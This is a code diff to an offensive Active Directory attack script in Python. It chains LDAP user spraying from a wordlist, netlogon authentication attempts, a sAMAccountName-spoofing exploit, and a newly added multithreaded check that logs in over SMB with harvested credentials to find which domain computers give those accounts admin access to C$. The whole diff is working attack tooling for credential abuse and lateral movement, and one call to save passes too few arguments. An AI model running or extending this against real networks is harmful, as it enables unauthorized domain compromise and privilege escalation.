@@ -8,6 +8,9 @@ import argparse
 import json
 import ldap3
 import signal
+import threading
+import queue
+
 
 from sam_spoof import SamExploit
 from get_desc import LdapSearch
@@ -15,6 +18,9 @@ from my_print import *
 from utils.helper import GETTGT
 from utils.S4U2self import GETST
 from impacket.dcerpc.v5 import samr, nrpc, epm, transport
+from impacket.smbconnection import SMBConnection, SessionError
+
+THREADS_NUMBERS = 35
 
 def exit_loop(signum, frame):
 	global pressed, is_sigint
@@ -26,7 +32,27 @@ def exit_loop(signum, frame):
 		warn("Exiting ...")
 		exit(0)
 
-def ldap_spray(ldap_searcher, wordlist='THE Wordlist'):
+class CheckAdminThread(threading.Thread):
+	def __init__(self, username, password, domain_name, queue):      # jusqua = donnée supplémentaire
+		threading.Thread.__init__(self)  # ne pas oublier cette ligne
+		# (appel au constructeur de la classe mère)
+		self.username = username
+		self.password = password
+		self.domain_name = domain_name
+		self.queue = queue
+
+	def run(self):
+		while True:
+			if not self.queue.empty():
+				comp = self.queue.get()
+
+				r = is_admin(comp, self.username, self.password, self.domain_name)
+				if(r):
+					success(f"{self.username} is admin on {comp}")
+			else:
+				break
+
+def ldap_spray(ldap_searcher, wordlist='/home/kali/tools/wordlists-master/OCD_common_users_FR.txt'):
 		with open(wordlist, 'r') as f:
 			words = f.readlines()
 
@@ -39,7 +65,7 @@ def ldap_spray(ldap_searcher, wordlist='THE Wordlist'):
 def save(value_json, filename):
 	with open(filename, 'w') as f:
 		for a,b in value_json.items():
-			f.write(f'{a}:{b}')
+			f.write(f'{a}:{b}\n')
 		success(f'Data saved in {filename} !')
 
 
@@ -67,6 +93,26 @@ def try_auth(dc_handle, dc_ip, target):
 	except nrpc.DCERPCSessionError as ex:
 		if ex.get_error_code() == 0xc0000022:
 			return None
+
+def is_admin(computer_name, username, password, domain_name):
+	try:
+		print(f"{computer_name:50}\r", end='')
+		smbClient = SMBConnection(computer_name, computer_name, sess_port=445, timeout=0.5)
+		smbClient.login(username, password, domain_name)
+		is_admin = False
+
+		try:
+			smbClient.connectTree('C$') # Connect to C to see if user is admin
+			is_admin = True
+
+		except SessionError:
+			is_admin = False
+
+	except:
+		is_admin = False
+
+	return is_admin
+
 
 def atk(dc_handle, dc_ip, target):
 	global is_sigint
@@ -177,9 +223,9 @@ if __name__ == '__main__':
 
 
 	section("LDAP Anonymous")
+	ldap_requester = LdapSearch(domain_name, dc_ip, username, password)
+	ldap_requester.init_all()
 	if(input('Try Ldap anonymous ?(Y/n) ').lower() == 'y'):
-		ldap_requester = LdapSearch(domain_name, dc_ip, username, password)
-		ldap_requester.init_all()
 		ldap_requester.exec('users')
 		if(len(ldap_requester.res) != 0):
 			ldap_requester.exec('da')
@@ -214,8 +260,46 @@ if __name__ == '__main__':
 					account_found = 0
 
 
+
 	if(account_found):
 		options.u, options.p = list(ldap_requester.account.keys())[0], list(ldap_requester.account.values())[0]
+
+		section("Is Admin")
+		admin_users = {}
+		log("Recovering domains computers")
+		ldap_requester.exec('computers', quiet=True)
+		computers_list = ldap_requester.res.copy()
+		log(f"Queue initialized (length {len(computers_list)})")
+
+		for i in range(len(ldap_requester.account.keys())):
+			username, password = list(ldap_requester.account.keys())[i], list(ldap_requester.account.values())[i]
+
+			computer_queue = queue.Queue(len(computers_list)) # Initializing queue again
+			for c in computers_list:
+				computer_queue.put(c)
+
+			log(f'User: {username}')
+			Threading_list = []
+			if(len(computers_list) < 30):
+				for i in range(len(computers_list)):
+					is_admin_thread = CheckAdminThread(username, password, domain_name, computer_queue)
+					Threading_list.append(is_admin_thread)
+
+			else:
+				for i in range(THREADS_NUMBERS):
+					is_admin_thread = CheckAdminThread(username, password, domain_name, computer_queue)
+					Threading_list.append(is_admin_thread)
+
+			log(f"Launching check on {len(computers_list)} computers with user {username}")
+			for thread in Threading_list:
+				thread.start()
+
+			for thread_end in Threading_list:
+				thread_end.join()
+		
+		if(len(admin_users) != 0):
+			save(admin_users)
+
 		section("Recovering info")
 		ldap_requester.add_account(list(ldap_requester.account.keys())[0], list(ldap_requester.account.values())[0])
 		section("User info")
@@ -235,6 +319,7 @@ if __name__ == '__main__':
 			SamAdmin = SamExploit(options)
 			SamAdmin.init_all()
 			SamAdmin.samr_exp()
+
 
 
 
